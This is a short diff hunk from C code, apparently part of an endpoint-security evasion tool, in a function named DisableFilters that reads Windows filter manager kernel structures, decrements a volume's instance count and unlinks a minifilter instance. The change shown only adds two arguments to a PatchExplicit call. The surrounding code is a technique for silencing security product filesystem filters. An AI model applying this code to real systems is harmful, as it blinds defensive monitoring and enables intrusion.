@@ -177,7 +177,7 @@ void DisableFilters(const DWORD64 FLTP_FRAME) {
       DWORD64 FLT_VOLUME = ReadMemoryDWORD64(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__Volume]);
       DWORD64 pFLT_VOLUME_InstanceList_count = FLT_VOLUME + g_fltmgrOffsets[FLTOS_FLT_VOLUME__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount];
       DWORD countVol = ReadMemoryDWORD(pFLT_VOLUME_InstanceList_count);
-      PatchExplicit(pFLT_VOLUME_InstanceList_count, (Value){ .dword = countVol - 1 }, (Value){ .dword = countVol }, S4);
+      PatchExplicit(pFLT_VOLUME_InstanceList_count, (Value){ .dword = countVol - 1 }, (Value){ .dword = countVol }, S4, 0, 0);
 
       removeDoubleLinkedNode(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink]);
     }
